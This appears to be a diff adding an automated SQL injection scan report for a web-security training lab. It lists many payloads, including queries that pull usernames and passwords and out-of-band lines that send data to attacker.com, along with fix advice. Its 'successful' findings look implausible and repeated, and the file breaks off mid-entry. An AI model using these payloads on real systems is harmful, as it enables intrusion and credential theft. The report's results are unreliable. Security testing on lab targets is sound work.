@@ -1,0 +1,1212 @@
+{
+  "target_url": "https://0a2b001203cfe7bb8479231900790086.web-security-academy.net/product?productId=2",
+  "assessment_summary": {
+    "total_parameters_tested": 2,
+    "vulnerable_parameters": 2,
+    "total_injection_tests": 140,
+    "successful_injections": 25,
+    "confidence_score": 0.944,
+    "risk_level": "CRITICAL"
+  },
+  "vulnerable_parameters": [
+    "productId",
+    "storeId"
+  ],
+  "successful_injections": [
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL,NULL,NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT 1,2,3--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT 1,2,3,4--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT 1,2,3,4,5--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT 'a','b','c'--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT 'a','b','c','d'--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT 'a','b','c','d','e'--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT @@version,NULL,NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5))--",
+      "type": "time_based",
+      "confidence": 0.8,
+      "extracted_data": null,
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL,NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL,NULL,NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT 1,2,3--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT 1,2,3,4--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT 1,2,3,4,5--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT 'a','b','c'--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT 'a','b','c','d'--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT 'a','b','c','d','e'--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    },
+    {
+      "parameter": "N/A",
+      "payload": "' UNION SELECT @@version,NULL,NULL--",
+      "type": "union_based",
+      "confidence": 0.95,
+      "extracted_data": "detected",
+      "error_message": null
+    }
+  ],
+  "recommendations": [
+    "CRITICAL: SQL injection vulnerabilities detected!",
+    "Immediate action required to secure the application",
+    "Use parameterized queries or prepared statements",
+    "Implement input validation and sanitization",
+    "Consider using an ORM framework"
+  ],
+  "technical_details": {
+    "discovered_parameters": [
+      "productId",
+      "storeId"
+    ],
+    "all_test_results": [
+      {
+        "payload": "' OR '1'='1",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.2199037075042725,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 1=1--",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.2293100357055664,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 1=1#",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 0.958942174911499,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 1=1/*",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 2.0172641277313232,
+        "confidence": 0.0
+      },
+      {
+        "payload": "admin' OR '1'='1'--",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.004685878753662,
+        "confidence": 0.0
+      },
+      {
+        "payload": "admin' OR 1=1--",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.2548518180847168,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 'x'='x",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.3205599784851074,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 'a'='a",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.1266100406646729,
+        "confidence": 0.0
+      },
+      {
+        "payload": "') OR ('1'='1",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.9468448162078857,
+        "confidence": 0.0
+      },
+      {
+        "payload": "') OR (1=1--",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.1275198459625244,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 1=1 OR '1'='1",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.1261000633239746,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR '1'='1' OR '1'='1",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.127547264099121,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; WAITFOR DELAY '00:00:05'--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.0290563106536865,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SLEEP(5)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.122727870941162,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; BENCHMARK(5000000,MD5(1))--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.0220589637756348,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT pg_sleep(5)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.1264543533325195,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT SLEEP(5)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.1289994716644287,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 0.9826033115386963,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5))--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.1672749519348145,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; IF(1=1,SLEEP(5),0)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.1263890266418457,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.332047700881958,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; WAITFOR DELAY '00:00:03'--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.1273744106292725,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SLEEP(3)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 0.9785659313201904,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; BENCHMARK(3000000,MD5(1))--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.7948434352874756,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.706946849822998,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.238938570022583,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT database()),0x7e,0x78) s) AS t),8446744073709551610,8446744073709551610)))--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.1241650581359863,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.1681923866271973,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.3019959926605225,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; DECLARE @q VARCHAR(8000);SELECT @q=0x73656c65637420404076657273696f6e;EXEC(@q)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.0145633220672607,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)) FROM dual--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.3007423877716064,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.156693696975708,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 0.9425673484802246,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.0024354457855225,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e),1)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.1304397583007812,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e))--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.226806879043579,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' UNION SELECT NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.2105951309204102,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.0411734580993652,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL,NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.0241577625274658,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL,NULL,NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.2277140617370605,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.045177698135376,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.0062644481658936,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3,4--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.1270909309387207,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3,4,5--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.126899242401123,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT 'a','b','c'--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.0787208080291748,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT 'a','b','c','d'--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 0.9687509536743164,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT 'a','b','c','d','e'--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.543717384338379,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT @@version,NULL,NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.2227468490600586,
+        "confidence": 0.95
+      },
+      {
+        "payload": "'; SELECT @@version--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.1295886039733887,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT database()--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 0.9214904308319092,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT user()--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 2.3430655002593994,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT table_name FROM information_schema.tables--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.3442189693450928,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT column_name FROM information_schema.columns--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.2299246788024902,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT table_schema FROM information_schema.tables--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.1260013580322266,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT table_name,column_name FROM information_schema.columns--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.7217495441436768,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT username,password FROM users--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.1544764041900635,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT username,password,email FROM users--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.1202621459960938,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT CONCAT(username,':',password) FROM users--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.3294053077697754,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT CONCAT(username,':',password,':',email) FROM users--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.742840051651001,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT COUNT(*) FROM users--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.3328545093536377,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.1250782012939453,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\'))--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.1289875507354736,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com')--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.1273698806762695,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT database() FROM dual)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.1270198822021484,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT table_name FROM information_schema.tables WHERE ROWNUM=1)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.1238865852355957,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT column_name FROM information_schema.columns WHERE ROWNUM=1)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.031371831893921,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM users WHERE ROWNUM=1)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.1209521293640137,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)) FROM dual--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 0.8845603466033936,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT database() FROM dual)||'.attacker.com')--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 0.8616147041320801,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT table_name FROM information_schema.tables WHERE ROWNUM=1)||'.attacker.com')--",
+        "type": "out_of_band",
+        "success": false,
+        "response_time": 1.0227222442626953,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR '1'='1",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.1382837295532227,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 1=1--",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.0135223865509033,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 1=1#",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.126183032989502,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 1=1/*",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 2.6640586853027344,
+        "confidence": 0.0
+      },
+      {
+        "payload": "admin' OR '1'='1'--",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.0253074169158936,
+        "confidence": 0.0
+      },
+      {
+        "payload": "admin' OR 1=1--",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.0593645572662354,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 'x'='x",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.6030399799346924,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 'a'='a",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.2283711433410645,
+        "confidence": 0.0
+      },
+      {
+        "payload": "') OR ('1'='1",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 2.0502569675445557,
+        "confidence": 0.0
+      },
+      {
+        "payload": "') OR (1=1--",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.0443809032440186,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR 1=1 OR '1'='1",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 1.1109893321990967,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' OR '1'='1' OR '1'='1",
+        "type": "boolean_based",
+        "success": false,
+        "response_time": 4.055962085723877,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; WAITFOR DELAY '00:00:05'--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.1709463596343994,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SLEEP(5)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 2.969087600708008,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; BENCHMARK(5000000,MD5(1))--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.8426861763000488,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT pg_sleep(5)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.2289917469024658,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT SLEEP(5)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.8495566844940186,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.3330528736114502,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND (SELECT COUNT(*) FROM users WHERE SLEEP(5))--",
+        "type": "time_based",
+        "success": true,
+        "response_time": 3.062225341796875,
+        "confidence": 0.8
+      },
+      {
+        "payload": "'; IF(1=1,SLEEP(5),0)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.3538844585418701,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.311952829360962,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; WAITFOR DELAY '00:00:03'--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.0361323356628418,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SLEEP(3)--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.1139700412750244,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; BENCHMARK(3000000,MD5(1))--",
+        "type": "time_based",
+        "success": false,
+        "response_time": 1.1277668476104736,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.1267683506011963,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.125225305557251,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,(SELECT database()),0x7e,0x78) s) AS t),8446744073709551610,8446744073709551610)))--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.1288490295410156,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.234614610671997,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.2232375144958496,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; DECLARE @q VARCHAR(8000);SELECT @q=0x73656c65637420404076657273696f6e;EXEC(@q)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.3336656093597412,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)) FROM dual--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 3.68695068359375,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user()),0x7e),1)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 0.9473938941955566,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user()),0x7e))--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.1029841899871826,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.129380702972412,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e),1)--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 1.125763177871704,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1),0x7e))--",
+        "type": "error_based",
+        "success": false,
+        "response_time": 0.8631880283355713,
+        "confidence": 0.0
+      },
+      {
+        "payload": "' UNION SELECT NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 0.8684120178222656,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.0383274555206299,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL,NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.1254138946533203,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL,NULL,NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.1252059936523438,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 0.9558172225952148,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.009671926498413,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3,4--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.1140191555023193,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT 1,2,3,4,5--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.1238806247711182,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT 'a','b','c'--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.0249273777008057,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT 'a','b','c','d'--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.0263559818267822,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT 'a','b','c','d','e'--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.128657341003418,
+        "confidence": 0.95
+      },
+      {
+        "payload": "' UNION SELECT @@version,NULL,NULL--",
+        "type": "union_based",
+        "success": true,
+        "response_time": 1.016981840133667,
+        "confidence": 0.95
+      },
+      {
+        "payload": "'; SELECT @@version--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.0247018337249756,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT database()--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.3309977054595947,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT user()--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.1266391277313232,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT table_name FROM information_schema.tables--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.1283879280090332,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT column_name FROM information_schema.columns--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.1284003257751465,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT table_schema FROM information_schema.tables--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.3339180946350098,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT table_name,column_name FROM information_schema.columns--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.1271092891693115,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT username,password FROM users--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 2.009587287902832,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT username,password,email FROM users--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.062079906463623,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT CONCAT(username,':',password) FROM users--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.1276910305023193,
+        "confidence": 0.0
+      },
+      {
+        "payload": "'; SELECT CONCAT(username,':',password,':',email) FROM users--",
+        "type": "stacked_queries",
+        "success": false,
+        "response_time": 1.1275434494018555,
+        "confidence": 0.0
+      },
+      {
